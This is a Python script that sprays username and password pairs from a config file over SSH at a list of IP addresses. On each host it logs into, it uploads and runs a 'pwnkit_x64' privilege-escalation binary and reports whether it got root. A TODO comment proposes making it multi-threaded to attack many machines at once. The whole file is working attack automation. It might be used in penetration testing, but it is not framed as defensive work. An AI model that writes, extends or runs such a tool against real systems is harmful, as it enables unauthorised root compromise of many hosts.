import paramiko
import yaml
import os
import sys
sys.path.append("..")
from BetterLogger import BetterLogger

filename = os.path.basename(__file__)
logger = BetterLogger(logger_name=filename).logger

COLOR_OKGREEN = '\033[92m'
COLOR_FAIL = '\033[91m'
COLOR_END = '\033[0m'

def read_config_file():
	logger.debug("Reading config file...")
	with open("../config.yaml", 'r') as file_in:
		parsed_config = yaml.safe_load(file_in)
	logger.debug("Successfully read config file")
	return parsed_config

def check_login(ip_address, username, password):
	try:
		logger.info(f"Connecting to {username}@{ip_address}...")
		ssh_client = paramiko.SSHClient()
		ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh_client.connect(ip_address, username=username, password=password, timeout=5)
		logger.info(f"Successfully connected to {username}@{ip_address}")
	except Exception as err:
		logger.error(err)
		logger.info(f"{COLOR_FAIL}Failed to connect to {username}@{ip_address}{COLOR_END}")
		return

	logger.info("Copying pwnkit_x64 binary over SSH...")
	sftp = ssh_client.open_sftp()
	pwnkit_binary_name = "pwnkit_x64"
	sftp.put(localpath=f"./{pwnkit_binary_name}", remotepath=f"/home/{username}/{pwnkit_binary_name}", confirm=True)
	logger.info(f"Successfully copied {pwnkit_binary_name} binary over SSH")
	sftp.close()

	ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"chmod +x ./{pwnkit_binary_name}")

	logger.info("Checking for root privileges...")
	ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo 'whoami' | ./{pwnkit_binary_name}")
	output_as_string = ssh_stdout.read().decode().strip()
	logger.debug(f"'whoami' output: {output_as_string}")
	ssh_client.close()

	if output_as_string == "root":
		logger.info(f"{COLOR_OKGREEN}Successfully got root on {username}@{ip_address}{COLOR_END}")
	else:
		logger.info(f"{COLOR_FAIL}Failed to get root, the system does not seem to be vulnerable{COLOR_END}")

def main():
	config = read_config_file()
	ips = config["ips"]
	credentials = config["credentials"]

	# TODO: Make this section multi-threaded so you can connect to a ton of machines simultaneously
	for ip in ips:
		for credential in credentials:
			try:
				check_login(ip_address=ip, username=credential["username"], password=credential["password"])
			except Exception as err:
				logger.exception(err)

if __name__ == "__main__":
	main()
